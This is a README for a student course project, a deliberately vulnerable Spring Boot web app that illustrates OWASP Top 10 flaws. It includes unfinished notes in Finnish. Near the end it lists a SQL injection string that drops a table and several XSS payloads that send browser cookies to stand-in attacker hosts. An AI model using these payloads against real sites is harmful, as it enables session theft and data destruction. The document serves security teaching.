# Cyber Security Base 2019 -project

This app is a project created for MOOC course Cyber Security Base 2019-2020.

## Project description
In the first course project, your task is to create a web application that has at least five different flaws from the OWASP top ten list (https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).


## Project essay
LINK: https://github.com/nurvel/spring-owasp-vulnerable-app

The app is created with Spring Boot. You can start up the app in IDE or on command line with '''mvn spring-boot:run'''
Server will start to port 8080, navigate to localhost:8080.
The database is H2 and will be initialized with necessary data on every startup. If you want to reset, just restart the app.

Log in as student:
Username: student
Password: password

Log in as teacher:
Username: teacher
Password: password


### FLAW 1: A1:2017-Injection
#### OWASP description of the security flaw:
> Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent
to an interpreter as part of a command or query. The attacker’s hostile data can trick the
interpreter into executing unintended commands or accessing data without proper authorization.

#### How the security flaw behaves in the app
In the URL '''http://localhost:8080/course''' it is possible to give feedback and have a discussion about the courses. This comment field enables user to inject SQL statements to the database. This is due that the implementation of the database query is done without sanitizing the input from the user.

#### How to fix the security flaw in the app
In the CourseController in method courseFeedback the INSERT statement is created with plain SQL-statement that does not sanitize the input. To fix this issue the input should be done using methods that the CourseRepository object provides or sanitizing the input using PreparedStatement.



#### How the security flaw behaves in the app
H2 data base URL not secured and using default password

#### How to fix the security flaw in the app
Change default password to H2


### FLAW 1: A6:2017-Security Misconfiguration
#### OWASP description of the security flaw:
Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
HTTP headers, and verbose error messages containing sensitive information. Not only must all
operating systems, frameworks, libraries, and applications be securely configured, but they must
be patched and upgraded in a timely fashion.
#### How the security flaw behaves in the app
H2 data base URL not secured and using default password
#### How to fix the security flaw in the app
Change default password to H2

### FLAW 2: A7:2017-Cross-Site Scripting (XSS)
#### OWASP description of the security flaw:
XSS flaws occur whenever an application includes untrusted data in a new web page without
proper validation or escaping, or updates an existing web page with user-supplied data using a
browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the
victim’s browser which can hijack user sessions, deface web sites, or redirect the user to
malicious sites.
#### How the security flaw behaves in the app
IDEA: thymeleaf salli XSS inserttaus HOX: mikä hyöty.. Ihan vaan kiusanteko tms?
#### How to fix the security flaw in the app

### FLAW 3: A3:2017-Sensitive Data Exposure
#### OWASP description of the security flaw:
Many web applications and APIs do not properly protect sensitive data, such as financial,
healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit
card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra
protection, such as encryption at rest or in transit, and requires special precautions when
exchanged with the browser.
#### How the security flaw behaves in the app
idea: näkee tietoja URL arvailulla jota ei pitäisi? --> kaikki en oppilaiden tiedot
#### How to fix the security flaw in the app
autorisointi urliin /

### FLAW 4: A10:2017-Insufficient Logging & Monitoring
#### OWASP description of the security flaw:
Insufficient logging and monitoring, coupled with missing or ineffective integration with incident
response, allows attackers to further attack systems, maintain persistence, pivot to more systems,
and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over
200 days, typically detected by external parties rather than internal processes or monitoring.
#### How the security flaw behaves in the app
#### How to fix the security flaw in the app

### FLAW 5: A9:2017-Using Components with Known Vulnerabilities
#### OWASP description of the security flaw:
Components, such as libraries, frameworks, and other software modules, run with the same
privileges as the application. If a vulnerable component is exploited, such an attack can facilitate
serious data loss or server takeover. Applications and APIs using components with known
vulnerabilities may undermine application defenses and enable various attacks and impacts.
#### How the security flaw behaves in the app
harjoituksesta joku missä oli tää?
#### How to fix the security flaw in the app



-- SQL injection =>  Hello insert
=> drop table?

INSERT INTO signup (address, name) VALUES ('testijuttu', 'moikka')

INSERT INTO signup (address, name) VALUES ('testijuttu', '
Bye bye courses!') ; DROP TABLE course; --
')

style=\"display: none;\"

<script>document.write("<img src=\"http://www.haxor.com/cookiesteal/" + document.cookie +"\" style=\"display: none;\" />")  </script>

# ALLA OLEVA TOIMII
<script>document.write("<img src=\"http://www.haxor.com/cookisteal/" + document.cookie +"\"/>")  </script>

<script>fetch("http://www.haxor.com/cookisteal/" + document.cookie) </script>
document.cookie="JSESSIONID=12EE43AF515F83867B20D94907108063"
<img src='https://yourserver.evil.com/collect.gif?cookie=' + document.cookie/>
